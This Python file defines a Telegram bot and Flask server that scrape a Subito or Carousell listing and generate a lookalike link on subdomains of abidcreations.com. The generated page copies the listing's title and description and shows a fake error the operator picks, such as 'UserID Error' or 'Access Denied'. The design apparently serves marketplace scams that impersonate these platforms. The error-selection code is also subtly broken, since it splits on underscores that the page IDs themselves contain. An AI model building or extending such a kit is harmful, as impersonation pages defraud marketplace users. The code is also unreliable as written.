import telebot
from telebot import types
import requests
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, abort
from threading import Thread

# Замените на токен вашего бота
BOT_TOKEN = ''
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Хранилище данных пользователя
user_data = {}

# HTML-шаблон страницы
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ title }}</h1>
    <p>{{ description }}</p>
    {% if error == 'userid' %}
        <div style="color:red;">Error: Incorrect UserID</div>
    {% elif error == 'page_not_found' %}
        <div style="color:red;">Error: Page Not Found</div>
    {% elif error == 'access_denied' %}
        <div style="color:red;">Error: Access Denied</div>
    {% endif %}
</body>
</html>
"""

# Команда /start и выбор сервиса
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn = types.KeyboardButton("Создать ссылку")
    markup.add(btn)
    bot.send_message(message.chat.id, "Привет! Нажми 'Создать ссылку' для начала.", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Создать ссылку")
def choose_service(message):
    # Клавиатура с выбором сервиса
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Subito", callback_data="service_subito"))
    markup.add(types.InlineKeyboardButton("Carousell", callback_data="service_carousell"))
    bot.send_message(message.chat.id, "Выберите сервис:", reply_markup=markup)

# Получение ссылки от пользователя и парсинг данных
@bot.callback_query_handler(func=lambda call: call.data.startswith("service_"))
def get_service_link(call):
    service = call.data.split("_")[1]
    user_data[call.from_user.id] = {"service": service}
    bot.send_message(call.message.chat.id, f"Отправьте ссылку на объявление на {service.capitalize()}.")

@bot.message_handler(func=lambda message: message.text.startswith("http"))
def handle_link(message):
    user_id = message.from_user.id
    service = user_data.get(user_id, {}).get("service")
    if not service:
        bot.send_message(message.chat.id, "Пожалуйста, выберите сервис, нажав 'Создать ссылку'.")
        return

    url = message.text
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.find("title").get_text() if soup.find("title") else "Объявление"
        description = soup.find("meta", {"name": "description"})["content"] if soup.find("meta", {"name": "description"}) else "Описание не найдено."

        # Сохраняем данные и создаем ссылку
        page_id = f"{service.upper()}_{user_id}"  # Уникальный ID страницы
        user_data[user_id]["title"] = title
        user_data[user_id]["description"] = description
        user_data[user_id]["page_id"] = page_id

        # Генерируем URL в нужном формате
        generated_url = f"https://{service}.abidcreations.com/get/{page_id}/"
        user_data[user_id]["url"] = generated_url

        # Показ кнопок ошибок
        show_error_buttons(message, page_id, generated_url)
    else:
        bot.send_message(message.chat.id, "Не удалось получить содержимое сайта. Проверьте ссылку.")

# Добавление кнопок ошибок
def show_error_buttons(message, page_id, generated_url):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("UserID Error", callback_data=f"error_{page_id}_userid"))
    markup.add(types.InlineKeyboardButton("Page Not Found", callback_data=f"error_{page_id}_page_not_found"))
    markup.add(types.InlineKeyboardButton("Access Denied", callback_data=f"error_{page_id}_access_denied"))
    bot.send_message(message.chat.id, f"Вот ваша сгенерированная ссылка: {generated_url}\n\nВыберите ошибку, которая должна отображаться:", reply_markup=markup)

# Обработка ошибок
@bot.callback_query_handler(func=lambda call: call.data.startswith("error_"))
def set_error(call):
    _, page_id, error_type = call.data.split("_")
    user_id = call.from_user.id
    if user_id in user_data and user_data[user_id]["page_id"] == page_id:
        user_data[user_id]["error"] = error_type
        bot.send_message(call.message.chat.id, f"Ошибка '{error_type}' будет отображена на сгенерированной ссылке.")

# Динамическая генерация страницы с ошибкой
@app.route('/get/<page_id>/')
def display_page(page_id):
    for user_id, data in user_data.items():
        if data.get("page_id") == page_id:
            title = data.get("title", "Объявление")
            description = data.get("description", "Описание не найдено.")
            error = data.get("error", None)
            return render_template_string(html_template, title=title, description=description, error=error)
    abort(404)

# Запуск бота и Flask-приложения
def run_flask():
    app.run(host="0.0.0.0", port=5000)

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    # Запуск Flask-приложения в отдельном потоке
    Thread(target=run_flask).start()
    # Запуск бота
    run_bot()